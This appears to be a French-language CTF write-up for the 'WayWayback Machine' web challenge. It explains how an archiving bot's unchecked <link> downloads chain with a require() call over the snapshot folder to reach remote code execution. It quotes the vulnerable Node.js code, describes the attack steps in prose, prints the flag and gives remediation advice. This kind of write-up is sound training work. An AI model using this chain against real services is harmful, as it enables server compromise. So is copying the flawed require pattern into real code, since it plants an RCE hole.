@@ -1,0 +1,58 @@
+---
+title: Write-up Batman's Kitchen CTF 2026 - WayWayback Machine
+date: '2026-02-22'
+description: 'Write-up CTF : WayWayback Machine (arbitrary file write to RCE)'
+tags:
+  - ctf
+  - web
+  - nodejs
+  - arbitrary-file-write
+  - rce
+  - puppeteer
+  - writeup
+---
+# Write-up CTF : WayWayback Machine (arbitrary file write to RCE)
+
+**Catégorie :** Web
+**Flag:** **`bkctf{m4yb3_1_sh0u1d_st1ck_w1th_4rch1v3_10}`**
+## 1. Introduction au challenge
+L'application "WayWayback Machine" propose d'archiver des pages web. Le fonctionnement repose sur un bot utilisant un navigateur headless (Puppeteer) qui visite l'URL fournie, extrait le code HTML, et télécharge localement les ressources associées (fichiers CSS/JS appelés via des balises `{html}<link>`) dans le répertoire `{js}/app/snapshots/` du serveur.
+## 2. Analyse des vulnérabilités (via white-boxing)
+La compromission du serveur repose sur l'enchaînement de deux vulnérabilités distinctes.
+
+**Vulnérabilité 1 : arbitrary file download (AFD)**
+Le bot analyse le code HTML à l'aide d'une expression régulière pour extraire et télécharger les ressources :
+```javascript
+const linkRegex = /<link[^>]+href=["']([^"']+)["'][^>]*>/gi;
+// ...
+// Le fichier distant est téléchargé et sauvegardé
+const savePath = path.join(SNAPSHOTS_DIR, filename);
+await downloadFile(resourceUrl, savePath);
+````
+
+En injectant une balise `{html}<link href="http://notre-site.com/exploit.js">` dans une page web contrôlée, le bot télécharge aveuglément ce script en le considérant comme une feuille de style inoffensive et l'enregistre sur le disque du serveur dans `{js}/snapshots/exploit.js`.
+
+**Vulnérabilité 2 : remote code execution (RCE)**
+L'application intègre une fonction d'optimisation censée précharger les ressources des snapshots pour l'affichage public :
+```JavaScript
+async function preloadSnapshotResources() {
+    const entries = fs.readdirSync(SNAPSHOTS_DIR, { withFileTypes: true });
+    for (const entry of entries) {
+      if (path.extname(entry.name) === '.js') {
+          require(filePath);  // <--- L'ERREUR
+      }
+    }
+}
+```
+
+Cette fonction itère sur le répertoire `{js}/snapshots/` et exécute la fonction native `{js}require()` sur tous les fichiers portant l'extension `{js}.js`. En environnement Node.js, `{js}require()` charge et exécute le module de manière synchrone. La confusion entre le dossier d'archives publiques et un dossier de code source légitime crée le point d'entrée critique.
+## 3. Exploitation
+La chaîne d'exploitation s'articule en plusieurs étapes automatisées :
+1. **Création du payload :** Développement d'un script Node.js (`exploit.js`) conçu pour ouvrir le fichier `flag.txt` du serveur cible, parcourir tous les fichiers `.html` du répertoire de snapshots, et injecter le contenu du flag à la fin de ces fichiers.
+2. **Hébergement :** Mise en ligne du payload `exploit.js` sur un serveur public comme tiiny host, accompagné d'une page `index.html` factice qui l'appelle via une balise `{html}<link>`.
+3. **Déclenchement de l'AFD :** Soumission de l'URL de la page factice au bot de la WayWayback Machine. Le bot télécharge `exploit.js` et le stocke dans le répertoire des snapshots.
+4. **Déclenchement de la RCE :** L'interaction avec le lien pour visualiser le snapshot force l'application à appeler la fonction `{js}preloadSnapshotResources()`.
+5. **Exécution :** L'application rencontre `exploit.js` et l'exécute via `{js}require()`. Le script réécrit les fichiers HTML locaux pour y apposer le flag, qui s'affiche ensuite avec succès sur la page de restitution du snapshot.
+## 4. Leçons à Tirer (remédiation)
+- **Danger de `{js}require()` :** L'utilisation de la fonction `{js}require()` sur des chemins de fichiers dynamiques, des dossiers contenant du contenu uploadé/téléchargé depuis internet, ou des variables non assainies équivaut à une vulnérabilité RCE critique immédiate en Node.js.
+- **Ségrégation des fichiers :** Un principe architectural fondamental consiste à isoler strictement les répertoires contenant la logique d'exécution du serveur (scripts, modules) des répertoires servant à stocker du contenu public ou généré par les utilisateurs (uploads, snapshots).
